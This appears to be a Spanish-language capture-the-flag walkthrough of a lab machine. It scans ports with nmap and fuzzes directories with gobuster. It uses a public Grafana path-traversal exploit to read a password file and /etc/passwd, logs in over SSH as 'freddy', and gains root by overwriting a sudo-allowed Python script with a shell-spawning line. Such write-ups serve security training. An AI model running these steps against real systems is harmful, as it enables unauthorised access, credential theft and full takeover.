### Enumeracion
Realizo escaneo enbusca de puertos abiertos.
```
nmap -p- --open --min-rate 4000 -sS -Pn -n 172.17.0.2 -oG puertos
```

Encuentro los puertos *21,22,80,3000* abiertos. Realizo un escaneo mas exhaustivo en búsqueda de servicios y versiones.
```
nmap -p21,22,80,3000 -sCV 172.17.0.2 -oN escaneo
```

Resultado obtenido:
- 21/tcp -> FTP (login anonimo habilitado)
- 22/tco -> SSH
- 80/tcp -> Apache (default page)
- 3000/tcp -> Grafana

#### Analisis de FTP
Accedo a ftp con el usuario *anonymous*
```
ftp 172.17.0.2
```

Se encuentra:
**/mantenimiento/database.kdbx**
Se encuentra un archivo interensante de base de dates KeePass (posibles credenciales), al no poseer permisos de escritura descarto este vector.

## Escaneo web
Realizo fuzzing en el puerto 80 en busqueda de directorios
```
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x js,txt,php,html -t 64
```

Resultado:
```
/index.html           (Status: 200) [Size: 10701]
/maintenance.html     (Status: 200) [Size: 63]
/server-status        (Status: 403) [Size: 275]
```

Ingreso en hhtp://172.17.0.2/maintenance.html encuentro lo siguiente:
```
# Website under maintenance, access is in /tmp/pass.txt
```
## Analisis de Grafana

Se realiza busqueda de exploit
```
searchsploit grafana
searchsploit -m multiple/webapps/50581.py
```

Lo ejecuto para buscar archivos.
```
python3 50581.py -H http://172.17.0.2:3000
```

Realizo lectura de el archivo /tmp/pass.txt el resultado es:
```
t9sH76gpQ82UFeZ3GXZS
```

Realizo busqueda en */etc/passwd* usuarios para la contraseña obtenida.
Se identifica un usuario *freddy*

### Ingreso SSH
Ingreso a ssh con el usuario y contraseña obtenidos
```
ssh freddy@172.17.0.2

t9sH76gpQ82UFeZ3GXZS
```

## Escalada de privilegios
Realizo busqueda de perisos SUDO y encuentro:
```
(ALL) NOPASSWD: /usr/bin/python3 /opt/maintenance.py
```
Esto me dice que puedo ejecutar el archivo maintenance.py con python3 como root.
Realizo busqueda de permisos de el archivo y tengo permisos de escritura asi que lo modifico para obtener acceso root
```
echo 'import os; os.system("/bin/bash")' > /opt/maintenance.py
```

```
freddy@ed1eb89daf2a:~$ sudo /usr/bin/python3 /opt/maintenance.py 
┌──(root㉿ed1eb89daf2a)-[/home/freddy]
└─# whoami
root
```
